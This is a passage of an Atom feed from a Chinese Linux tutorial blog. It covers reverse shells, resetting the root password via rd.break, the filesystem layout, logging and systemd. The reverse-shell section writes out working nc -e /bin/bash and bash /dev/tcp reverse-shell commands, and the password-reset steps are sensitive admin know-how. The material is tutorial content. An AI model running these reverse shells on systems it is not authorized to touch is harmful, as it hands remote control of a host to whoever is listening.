+<p>比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B 了。</p>
+<h2> 反弹 Shell 的作用</h2>
+<p>当我们使用 A 控制 B，但由于被控端因防火墙受限、权限不足、端口被占用等无法直接连接。这时我们就要使用反弹 Shell 让 B 向 A 主动发起连接，我们就可以使用 A 来控制 B 了。</p>
+<h2> 使用方法</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">控制端</th>
+<th style="text-align:center">被控制端</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">IP：192.168.4.151</td>
+<td style="text-align:center">IP：192.168.4.142</td>
+</tr>
+<tr>
+<td style="text-align:center">hostname：root@localhost</td>
+<td style="text-align:center">hostname：root@dev_03</td>
+</tr>
+</tbody>
+</table>
+<ol>
+<li>
+<p>控制端和被控制端都安装 nc 命令</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
+<li>
+<p>监听端口。在控制端上执行 <code>nc -lvvp 9999</code> 命令</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
+<li><code>-l</code>：监听模式，用于入站连接</li>
+<li><code>-vv</code>：<code>-vv</code> 比 <code>-v</code> 更详细的输出</li>
+<li><code>-p</code>：设置本地端口</li>
+</ul>
+</li>
+<li>
+<p>发起连接请求。在被控制端上执行 <code>nc -e /bin/bash [控制端的 IP] 9999</code> 命令</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul>
+<li><code>-e</code>：绑定命令行</li>
+</ul>
+<blockquote>
+<p>如果没有 <code>-e</code> 这个参数，是因为 <code>nc</code> 老版本没有这个选项的。需要安装 <code>netcat-traditional</code> 这个包，并执行 <code>update-alternatives --config nc</code> 这个命令，选择 <code>/bin/nc.traditional</code> 的编号，这里选择编号 <code>2</code> 即可</p>
+</blockquote>
+</li>
+<li>
+<p>控制端接收连接请求。被控制端发起连接请求后，查看控制端</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>测试。控制端进行测试</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+</ol>
+<h2> 被控制端使用 bash 发起连接</h2>
+<p>被控制端也可以不用安装 nc 这个命令发起连接，可以直接使用 bash 来实现。</p>
+<ol>
+<li>
+<p>监听端口。在控制端上执行 <code>nc -lvvp 9999</code> 命令</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>发起连接请求。在被控制端上执行 <code>bash -i &gt;&amp; /dev/tcp/[控制端的 IP]/9999 0&gt;&amp;1</code> 命令</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul>
+<li><code>bash -i</code>：就是产生一个 bash 交互环境</li>
+<li><code>&gt;&amp;</code>：可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方</li>
+<li><code>/dev/tcp/[控制端的 IP]/9999</code>：指的是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接</li>
+<li><code>0&gt;&amp;1</code>：可以将标准输入和标准输出相结合，重定向给前面标准输出的内容</li>
+</ul>
+<p>通过这样的命令，我们就可以就是将被控制端的标准输出和错误输出都重定向给控制端，并且将控制端的输入都重定向给被控制端，这样我们就可以实现控制端对被控制端的远程控制了。</p>
+</li>
+<li>
+<p>控制端接收连接请求。被控制端发起连接请求后，查看控制端，会显示被控制端的 localhost</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>测试。控制端进行测试</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+</ol>
+]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">重置 root 密码</title>
+    <id>https://sankgao.github.io/computer/linux/reset_root_password.html</id>
+    <link href="https://sankgao.github.io/computer/linux/reset_root_password.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> Linux 系统重置 root 密码</h2>
+<ol>
+<li>
+<p>重启 Linux 系统主机并出现引导界面时，按下键盘上的 “e” 键进入内核编辑界面</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Red Hat Enterprise Linux <span class="token punctuation">(</span><span class="token number">4.18</span>.0-80.el8.x86_64<span class="token punctuation">)</span> <span class="token number">8.0</span> <span class="token punctuation">(</span>Ootpa<span class="token punctuation">)</span>
+Red Hat Enterprise Linux <span class="token punctuation">(</span><span class="token number">0</span>-rescue-2307b5f70ab0473fa42eea2fe914eb95<span class="token punctuation">)</span> <span class="token number">8.0</span>
+
+
+
+
+User the ↑ and ↓ keys to change the selection.
+Press <span class="token string">'e'</span> to edit the selected item, or <span class="token string">'c'</span> <span class="token keyword">for</span> a <span class="token builtin class-name">command</span> prompt.
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>在 Linux 参数这行的最后面追加 “rd.break” 参数，然后按下 “Ctrl + x” 组合键来运行修改过的内核程序</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>load_video
+<span class="token builtin class-name">set</span> <span class="token assign-left variable">gfx_payload</span><span class="token operator">=</span>keep
+insmod gzio
+linux <span class="token punctuation">(</span><span class="token variable">$root</span><span class="token punctuation">)</span>/vmlinuz-4.18.0-80.el8.x86_64 <span class="token assign-left variable">root</span><span class="token operator">=</span>/dev/mapper/rhel-root ro resum<span class="token punctuation">\</span>
+<span class="token assign-left variable">e</span><span class="token operator">=</span>/dev/mapper/rhel-swap <span class="token assign-left variable">rd.lvm.lv</span><span class="token operator">=</span>rhel/root <span class="token assign-left variable">rd.lvm.lv</span><span class="token operator">=</span>rhel/swap rd.break
+initrd <span class="token punctuation">(</span><span class="token variable">$root</span><span class="token punctuation">)</span>/initramfs-4.18.0-80.el8.x86_64.img <span class="token variable">$tuned_initrd</span>
+
+
+
+
+Press Ctrl-x to start, Ctrl-c <span class="token keyword">for</span> a <span class="token builtin class-name">command</span> prompt or Escape to
+discard edits and <span class="token builtin class-name">return</span> to the menu. Pressing Tab lists 
+possible completions.
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>大约 30 秒后，进入到系统的紧急求援模式</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>switch_root:/<span class="token comment"># </span>
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
+<li>
+<p>依次输入以下命令，再连续按下两次 “Ctrl + d” 组合键来退出并重启，等待系统再次重启完毕后便可以使用新密码来登录 Linux 系统</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>switch_root:/<span class="token comment"># mount -o remount,rw /sysroot</span>
+switch_root:/<span class="token comment"># chroot /sysroot</span>
+sh-4.4<span class="token comment"># passwd</span>
+sh-4.4<span class="token comment"># touch /.autorelabel</span>
+sh-4.4<span class="token comment"># exit</span>
+switch_root:/<span class="token comment"># logout</span>
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+</ol>]]></summary>
+    <content type="html"><![CDATA[<h2> Linux 系统重置 root 密码</h2>
+<ol>
+<li>
+<p>重启 Linux 系统主机并出现引导界面时，按下键盘上的 “e” 键进入内核编辑界面</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>在 Linux 参数这行的最后面追加 “rd.break” 参数，然后按下 “Ctrl + x” 组合键来运行修改过的内核程序</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>大约 30 秒后，进入到系统的紧急求援模式</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
+<li>
+<p>依次输入以下命令，再连续按下两次 “Ctrl + d” 组合键来退出并重启，等待系统再次重启完毕后便可以使用新密码来登录 Linux 系统</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+</ol>
+]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">系统根目录</title>
+    <id>https://sankgao.github.io/computer/linux/root_directory.html</id>
+    <link href="https://sankgao.github.io/computer/linux/root_directory.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> Linux 系统根目录文件存放内容</h2>
+<p>在 Linux 系统中，目录、字符设备、套接字、硬盘、光驱、打印机等都会被抽象成了文件形式，即 “Linux 系统中一切皆为文件”。</p>
+<p>路径：分为绝对路径和相对路径，绝对路径指的是从根目录 <kbd>/</kbd> 开始写起文件名称，例如：查找 <code>aaa.txt</code> 文件位置 <code>/home/zhangsan/test/aaa.txt</code>，而相对路径指的是从当前目录开始写起文件名称，例如：当前在 <code>/home/zhangsan</code> 目录中，<code>aaa.txt</code> 文件位置就是 <code>test/aaa.txt</code>。</p>]]></summary>
+    <content type="html"><![CDATA[<h2> Linux 系统根目录文件存放内容</h2>
+<p>在 Linux 系统中，目录、字符设备、套接字、硬盘、光驱、打印机等都会被抽象成了文件形式，即 “Linux 系统中一切皆为文件”。</p>
+<p>路径：分为绝对路径和相对路径，绝对路径指的是从根目录 <kbd>/</kbd> 开始写起文件名称，例如：查找 <code>aaa.txt</code> 文件位置 <code>/home/zhangsan/test/aaa.txt</code>，而相对路径指的是从当前目录开始写起文件名称，例如：当前在 <code>/home/zhangsan</code> 目录中，<code>aaa.txt</code> 文件位置就是 <code>test/aaa.txt</code>。</p>
+<blockquote>
+<p>以下目录文件存放的内容为通常放置文件的位置，可以根据自己的情况更改文件位置</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">目录名称</th>
+<th style="text-align:left">应放置文件的内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">/boot</td>
+<td style="text-align:left">开机所需文件，如：内核文件</td>
+</tr>
+<tr>
+<td style="text-align:center">/dev</td>
+<td style="text-align:left">设备与接口文件，如：硬盘</td>
+</tr>
+<tr>
+<td style="text-align:center">/etc</td>
+<td style="text-align:left">软件的配置文件</td>
+</tr>
+<tr>
+<td style="text-align:center">/home</td>
+<td style="text-align:left">用户家目录文件</td>
+</tr>
+<tr>
+<td style="text-align:center">/bin</td>
+<td style="text-align:left">系统命令</td>
+</tr>
+<tr>
+<td style="text-align:center">/lib</td>
+<td style="text-align:left">开机用的函数库</td>
+</tr>
+<tr>
+<td style="text-align:center">/sbin</td>
+<td style="text-align:left">系统命令</td>
+</tr>
+<tr>
+<td style="text-align:center">/media</td>
+<td style="text-align:left">挂载设备文件</td>
+</tr>
+<tr>
+<td style="text-align:center">/opt</td>
+<td style="text-align:left">第三方软件</td>
+</tr>
+<tr>
+<td style="text-align:center">/root</td>
+<td style="text-align:left">系统管理员家目录</td>
+</tr>
+<tr>
+<td style="text-align:center">/srv</td>
+<td style="text-align:left">网络服务的数据文件</td>
+</tr>
+<tr>
+<td style="text-align:center">/tmp</td>
+<td style="text-align:left">“共享” 临时目录</td>
+</tr>
+<tr>
+<td style="text-align:center">/proc</td>
+<td style="text-align:left">虚拟文件目录</td>
+</tr>
+<tr>
+<td style="text-align:center">/usr/local</td>
+<td style="text-align:left">用户自行安装的软件</td>
+</tr>
+<tr>
+<td style="text-align:center">/usr/share</td>
+<td style="text-align:left">帮助说明文件</td>
+</tr>
+<tr>
+<td style="text-align:center">/var</td>
+<td style="text-align:left">经常变化的文件，如：日志</td>
+</tr>
+<tr>
+<td style="text-align:center">/lost+found</td>
+<td style="text-align:left">文件系统发生错误，存放一些丢失的文件片段</td>
+</tr>
+</tbody>
+</table>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">系统日志</title>
+    <id>https://sankgao.github.io/computer/linux/system_log.html</id>
+    <link href="https://sankgao.github.io/computer/linux/system_log.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> Linux 系统日志级别</h2>
+<p>在 rsyslog 服务程序中，日志根据重要程度被分为了九个等级，这样我们不必被海啸般的输出内容淹没，可以直接看最重要的内容。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">日志等级</th>
+<th style="text-align:left">说明介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">emerg</td>
+<td style="text-align:left">系统出现严重故障，内核崩溃等情况</td>
+</tr>
+<tr>
+<td style="text-align:center">alert</td>
+<td style="text-align:left">应立即修复的故障，数据库损坏等情况</td>
+</tr>
+<tr>
+<td style="text-align:center">crit</td>
+<td style="text-align:left">危险较高的故障，硬盘损坏导致程序运行失败的情况</td>
+</tr>
+<tr>
+<td style="text-align:center">err</td>
+<td style="text-align:left">一般危险的故障，某个服务启动或运行失败的情况</td>
+</tr>
+<tr>
+<td style="text-align:center">warning</td>
+<td style="text-align:left">警告信息，某个服务参数或功能错误的情况</td>
+</tr>
+<tr>
+<td style="text-align:center">notice</td>
+<td style="text-align:left">一般无危险的故障，只是需要处理的情况</td>
+</tr>
+<tr>
+<td style="text-align:center">info</td>
+<td style="text-align:left">通用性消息，给用户提升一些有用信息</td>
+</tr>
+<tr>
+<td style="text-align:center">debug</td>
+<td style="text-align:left">调试程序所产生的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">none</td>
+<td style="text-align:left">没有优先级，不做日志记录</td>
+</tr>
+</tbody>
+</table>]]></summary>
+    <content type="html"><![CDATA[<h2> Linux 系统日志级别</h2>
+<p>在 rsyslog 服务程序中，日志根据重要程度被分为了九个等级，这样我们不必被海啸般的输出内容淹没，可以直接看最重要的内容。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">日志等级</th>
+<th style="text-align:left">说明介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">emerg</td>
+<td style="text-align:left">系统出现严重故障，内核崩溃等情况</td>
+</tr>
+<tr>
+<td style="text-align:center">alert</td>
+<td style="text-align:left">应立即修复的故障，数据库损坏等情况</td>
+</tr>
+<tr>
+<td style="text-align:center">crit</td>
+<td style="text-align:left">危险较高的故障，硬盘损坏导致程序运行失败的情况</td>
+</tr>
+<tr>
+<td style="text-align:center">err</td>
+<td style="text-align:left">一般危险的故障，某个服务启动或运行失败的情况</td>
+</tr>
+<tr>
+<td style="text-align:center">warning</td>
+<td style="text-align:left">警告信息，某个服务参数或功能错误的情况</td>
+</tr>
+<tr>
+<td style="text-align:center">notice</td>
+<td style="text-align:left">一般无危险的故障，只是需要处理的情况</td>
+</tr>
+<tr>
+<td style="text-align:center">info</td>
+<td style="text-align:left">通用性消息，给用户提升一些有用信息</td>
+</tr>
+<tr>
+<td style="text-align:center">debug</td>
+<td style="text-align:left">调试程序所产生的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">none</td>
+<td style="text-align:left">没有优先级，不做日志记录</td>
+</tr>
+</tbody>
+</table>
+<h2> Linux 常见的日志文件保存路径</h2>
+<p>从理论上讲，日志文件分为三种类型：</p>
+<ul>
+<li>第一种：系统日志，主要记录系统的运行情况和内核信息</li>
+<li>第二种：用户日志，主要记录用户的访问信息，包含用户名、终端名称、时间、来源和执行过的操作等信息</li>
+<li>第三种：程序日志，主要记录着服务运行过程中各种事件的信息，每个服务程序自己有独立的日志文件，但是格式相差的比较大，一般稍微大一些的服务都会保存一份与其同名的日志文件</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">文件路径</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">/var/log/boot.log</td>
+<td style="text-align:left">系统开机自检事件及引导过程等信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/lastlog</td>
+<td style="text-align:left">用户登录成功时间、终端名称及 IP 地址等信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/btmp</td>
+<td style="text-align:left">记录登录失败的时间、终端名称及 IP 地址等信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/messages</td>
+<td style="text-align:left">系统及各个服务的运行和报错信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/secure</td>
+<td style="text-align:left">系统安全相关的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/wtmp</td>
+<td style="text-align:left">系统启动与关机等相关信息</td>
+</tr>
+</tbody>
+</table>
+<h2> journalctl</h2>
+<p>journalctl 用于检索个管理系统日志信息，可以根据事件、类型、服务名等信息进行信息检索，大大的提高了日常排错的效率，语法格式：<code>journalctl [参数]。</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-k</td>
+<td style="text-align:left">内核日志</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">启动日志</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">指定服务</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">指定条数</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">指定日志等级类型</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">实时刷新（追踪日志）</td>
+</tr>
+<tr>
+<td style="text-align:center">--since</td>
+<td style="text-align:left">指定时间</td>
+</tr>
+<tr>
+<td style="text-align:center">--disk-usage</td>
+<td style="text-align:left">占用空间</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">系统服务</title>
+    <id>https://sankgao.github.io/computer/linux/system_service.html</id>
+    <link href="https://sankgao.github.io/computer/linux/system_service.html"/>
+    <updated>2023-04-14T01:33:31.000Z</updated>
+    <summary type="html"><![CDATA[<h2> Linux 系统初始化进程</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">System V init 运行级别</th>
+<th style="text-align:center">Systemd 目标名称</th>
+<th style="text-align:center">Systemd 目标作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0</td>
+<td style="text-align:center">poweroff.target</td>
+<td style="text-align:center">关机</td>
+</tr>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">rescue.target</td>
+<td style="text-align:center">单用户模式</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">multi-user.target</td>
+<td style="text-align:center">多用户的文本界面</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td style="text-align:center">multi-user.target</td>
+<td style="text-align:center">多用户的文本界面</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center">multi-user.target</td>
+<td style="text-align:center">多用户的文本界面</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td style="text-align:center">graphical.target</td>
+<td style="text-align:center">多用户的图形界面</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">reboot.target</td>
+<td style="text-align:center">重启</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">emergency.target</td>
+<td style="text-align:center">救援模式</td>
+</tr>
+</tbody>
+</table>]]></summary>
+    <content type="html"><![CDATA[<h2> Linux 系统初始化进程</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">System V init 运行级别</th>
+<th style="text-align:center">Systemd 目标名称</th>
+<th style="text-align:center">Systemd 目标作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0</td>
+<td style="text-align:center">poweroff.target</td>
+<td style="text-align:center">关机</td>
+</tr>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">rescue.target</td>
+<td style="text-align:center">单用户模式</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">multi-user.target</td>
+<td style="text-align:center">多用户的文本界面</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td style="text-align:center">multi-user.target</td>
+<td style="text-align:center">多用户的文本界面</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center">multi-user.target</td>
+<td style="text-align:center">多用户的文本界面</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td style="text-align:center">graphical.target</td>
+<td style="text-align:center">多用户的图形界面</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">reboot.target</td>
+<td style="text-align:center">重启</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">emergency.target</td>
+<td style="text-align:center">救援模式</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>RHEL 5/6 系统使用 service、chkconfig 等命令来管理系统服务，RHEL 7/8 系统使用 systemctl 命令来管理系统服务</p>
+</blockquote>
+<h2> 服务启动、重启、停止、重载、查看状态等常用命令：</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">RHEL 5/6 系统</th>
+<th style="text-align:center">RHEL 7/8 系统</th>
+<th style="text-align:center">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">service foo start</td>
+<td style="text-align:center">systemctl start httpd</td>
+<td style="text-align:center">启动服务</td>
+</tr>
+<tr>
+<td style="text-align:center">service foo restart</td>
+<td style="text-align:center">systemctl restart httpd</td>
+<td style="text-align:center">重启服务</td>
+</tr>
+<tr>
+<td style="text-align:center">service foo stop</td>
+<td style="text-align:center">systemctl stop httpd</td>
+<td style="text-align:center">停止服务</td>
+</tr>
+<tr>
+<td style="text-align:center">service foo reload</td>
+<td style="text-align:center">systemctl reload httpd</td>
+<td style="text-align:center">重新加载配置文件（不终止服务）</td>
+</tr>
+<tr>
+<td style="text-align:center">service foo status</td>
+<td style="text-align:center">systemctl status httpd</td>
+<td style="text-align:center">查看服务状态</td>
+</tr>
+</tbody>
+</table>
+<h2> 服务开机启动、开机不启动、查看各级别下服务启动状态等常用命令：</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">RHEL 5/6 系统</th>
+<th style="text-align:center">RHEL 7/8 系统</th>
+<th style="text-align:center">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">chkconfig foo on</td>
+<td style="text-align:center">systemctl enable httpd</td>
+<td style="text-align:center">开机自动启动</td>
+</tr>
+<tr>
+<td style="text-align:center">chkconfig foo off</td>
+<td style="text-align:center">systemctl disable httpd</td>
+<td style="text-align:center">开机不自动启动</td>
+</tr>
+<tr>
+<td style="text-align:center">chkconfig foo</td>
+<td style="text-align:center">systemctl is-enabled httpd</td>
+<td style="text-align:center">查看特定服务是否为开机自启动</td>
+</tr>
+<tr>
+<td style="text-align:center">chkconfig --list</td>
+<td style="text-align:center">systemctl list-unit-files-type=httpd</td>
+<td style="text-align:center">查看各个级别下服务的启动与禁用情况</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    <category term="Computer"/>
+    <published>2023-04-14T01:33:31.000Z</published>
+  </entry>
+</feed>
